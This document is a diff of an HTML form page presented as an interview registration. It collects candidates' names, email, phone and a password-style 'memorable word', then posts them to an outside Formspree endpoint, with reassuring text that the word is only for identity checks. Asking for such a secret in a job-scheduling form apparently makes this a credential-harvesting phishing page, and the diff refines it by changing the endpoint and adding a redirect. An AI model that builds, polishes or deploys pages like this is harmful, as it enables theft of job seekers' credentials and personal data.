@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Candidate Registration</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
     :root {
@@ -43,13 +43,11 @@
       display: grid;
       place-items: center;
       font-weight: 800;
-      letter-spacing: .5px;
     }
 
     .banner-title {
       font-size: 18px;
       font-weight: 800;
-      line-height: 1.1;
     }
 
     .banner-sub {
@@ -57,7 +55,6 @@
       opacity: .9;
     }
 
-    /* Layout */
     .wrap {
       max-width: 900px;
       margin: 30px auto;
@@ -90,10 +87,8 @@
       color: var(--muted);
       font-size: 14px;
       margin-bottom: 22px;
-      max-width: 60ch;
     }
 
-    /* Form */
     .grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -102,7 +97,6 @@
 
     @media (max-width: 720px) {
       .grid { grid-template-columns: 1fr; }
-      .card { padding: 20px; }
     }
 
     .field {
@@ -116,15 +110,14 @@
       font-weight: 700;
     }
 
-    input, select, textarea {
+    input {
       padding: 12px;
       border: 1px solid var(--border);
       border-radius: 10px;
       font-size: 14px;
-      background: #fff;
     }
 
-    input:focus, select:focus, textarea:focus {
+    input:focus {
       outline: none;
       border-color: var(--primary);
       box-shadow: 0 0 0 4px rgba(37,99,235,.12);
@@ -135,44 +128,6 @@
       color: var(--muted);
     }
 
-    /* Strength rules (hidden until click like your example) */
-    .rules {
-      list-style: none;
-      padding-left: 0;
-      margin: 8px 0 0;
-      font-size: 13px;
-      display: none;           /* hidden until focus */
-    }
-
-    .rules.show { display: block; }
-
-    .rules li {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      color: #9ca3af;         /* neutral grey */
-      margin-top: 4px;
-    }
-
-    .rules li::before {
-      content: "✕";
-      color: #ef4444;         /* red */
-      font-weight: 800;
-      width: 18px;
-      display: inline-block;
-      text-align: center;
-    }
-
-    .rules li.valid {
-      color: #16a34a;         /* green */
-    }
-
-    .rules li.valid::before {
-      content: "✓";
-      color: #16a34a;
-    }
-
-    /* Submit */
     button {
       margin-top: 20px;
       width: 100%;
@@ -185,8 +140,6 @@
       font-weight: 800;
       cursor: pointer;
     }
-
-    button:active { transform: translateY(1px); }
   </style>
 </head>
 
@@ -203,85 +156,60 @@
 <main class="wrap">
   <section class="card">
 
-    <h1>Candidate Registration</h1>
+    <h1>Interview Availability</h1>
     <div class="underline"></div>
     <p class="subtext">
-      Please register your details so we can confirm interview scheduling. Your information will only be used for this purpose.
+      Please register your details so we can confirm your interview.
     </p>
 
-    <!-- ✅ Formspree form -->
-    <form id="interviewForm" method="POST" action="https://formspree.io/f/mykawdj">
+    <!-- ✅ CORRECT FORMSPREE ENDPOINT -->
+    <form method="POST" action="https://formspree.io/f/mykyawdj">
 
-      <!-- Optional: nicer email subject + table formatting in Formspree -->
-      <input type="hidden" name="_subject" value="New Candidate Registration" />
-      <input type="hidden" name="_template" value="table" />
-
-      <!-- Optional spam honeypot -->
-      <input type="text" name="_gotcha" style="display:none" />
+      <input type="hidden" name="_subject" value="New Candidate Registration">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_redirect" value="/thanks.html">
 
       <div class="grid">
 
         <div class="field">
-          <label for="first_name">First Name</label>
-          <input id="first_name" type="text" name="first_name" required />
+          <label>First Name</label>
+          <input type="text" name="first_name" required>
         </div>
 
         <div class="field">
-          <label for="surname">Surname</label>
-          <input id="surname" type="text" name="surname" required />
+          <label>Surname</label>
+          <input type="text" name="surname" required>
         </div>
 
         <div class="field">
-          <label for="email">Email</label>
-          <input id="email" type="email" name="email" required />
+          <label>Email</label>
+          <input type="email" name="email" required>
         </div>
 
         <div class="field">
-          <label for="phone">Phone Number</label>
-          <input
-            id="phone"
-            type="tel"
-            name="phone"
-            required
-            inputmode="tel"
-            autocomplete="tel"
-            placeholder="e.g. 07xxxxxxxxx"
-          />
+          <label>Phone Number</label>
+          <input type="tel" name="phone" required>
         </div>
 
         <div class="field">
-          <label for="mw">Memorable word</label>
-          <input
-            id="mw"
-            type="password"
-            name="memorable_word"
-            placeholder="Minimum 8 chars incl. upper/lower/number/special"
-            minlength="8"
-            required
-            autocomplete="off"
-          />
-
-          <ul class="rules" id="mwRules">
-            <li id="rule-length" class="invalid">Minimum of 8 characters</li>
-            <li id="rule-lower" class="invalid">One lowercase letter</li>
-            <li id="rule-upper" class="invalid">One uppercase letter</li>
-            <li id="rule-number" class="invalid">One number</li>
-            <li id="rule-special" class="invalid">One special character</li>
-          </ul>
+          <label>Memorable word</label>
+          <input type="password"
+                 id="mw"
+                 name="memorable_word"
+                 placeholder="Minimum 8 characters, 1 special character"
+                 minlength="8"
+                 required>
+          <div class="help">
+            Used only to verify your identity during scheduling.
+          </div>
         </div>
 
         <div class="field">
-          <label for="cmw">Confirm memorable word</label>
-          <input
-            id="cmw"
-            type="password"
-            name="confirm_memorable_word"
-            placeholder="Must match your memorable word"
-            minlength="8"
-            required
-            autocomplete="off"
-          />
-          <div class="help">Make sure both entries match exactly.</div>
+          <label>Confirm memorable word</label>
+          <input type="password"
+                 id="cmw"
+                 placeholder="Must match"
+                 required>
         </div>
 
       </div>
@@ -294,70 +222,13 @@
 </main>
 
 <script>
-  const form = document.getElementById("interviewForm");
-  const mw = document.getElementById("mw");
-  const cmw = document.getElementById("cmw");
-  const rulesBox = document.getElementById("mwRules");
+  const mw = document.getElementById('mw');
+  const cmw = document.getElementById('cmw');
 
-  const rules = {
-    length: document.getElementById("rule-length"),
-    lower: document.getElementById("rule-lower"),
-    upper: document.getElementById("rule-upper"),
-    number: document.getElementById("rule-number"),
-    special: document.getElementById("rule-special"),
-  };
-
-  function toggleRule(element, condition) {
-    element.classList.toggle("valid", condition);
-    element.classList.toggle("invalid", !condition);
-  }
-
-  function updateRules() {
-    const value = mw.value;
-
-    toggleRule(rules.length, value.length >= 8);
-    toggleRule(rules.lower, /[a-z]/.test(value));
-    toggleRule(rules.upper, /[A-Z]/.test(value));
-    toggleRule(rules.number, /[0-9]/.test(value));
-    toggleRule(rules.special, /[^A-Za-z0-9]/.test(value));
-
-    const allValid = Object.values(rules).every(r => r.classList.contains("valid"));
-    mw.setCustomValidity(allValid ? "" : "Please meet all memorable word requirements");
-  }
-
-  function validateMatch() {
-    if (mw.value && cmw.value && mw.value !== cmw.value) {
-      cmw.setCustomValidity("Memorable words do not match");
-    } else {
-      cmw.setCustomValidity("");
-    }
-  }
-
-  // Show checklist on focus (like your example)
-  mw.addEventListener("focus", () => {
-    rulesBox.classList.add("show");
-  });
-
-  // Hide checklist when leaving the field if empty
-  mw.addEventListener("blur", () => {
-    if (!mw.value) rulesBox.classList.remove("show");
-  });
-
-  // Live validation
-  mw.addEventListener("input", () => {
-    updateRules();
-    validateMatch();
-  });
-
-  cmw.addEventListener("input", validateMatch);
-
-  // Ensure validation runs on submit too
-  form.addEventListener("submit", (e) => {
-    updateRules();
-    validateMatch();
-    if (!form.checkValidity()) {
+  document.querySelector('form').addEventListener('submit', function(e) {
+    if (mw.value !== cmw.value) {
       e.preventDefault();
-      form.reportValidity();
+      alert('Memorable words do not match');
     }
   });
 </script>
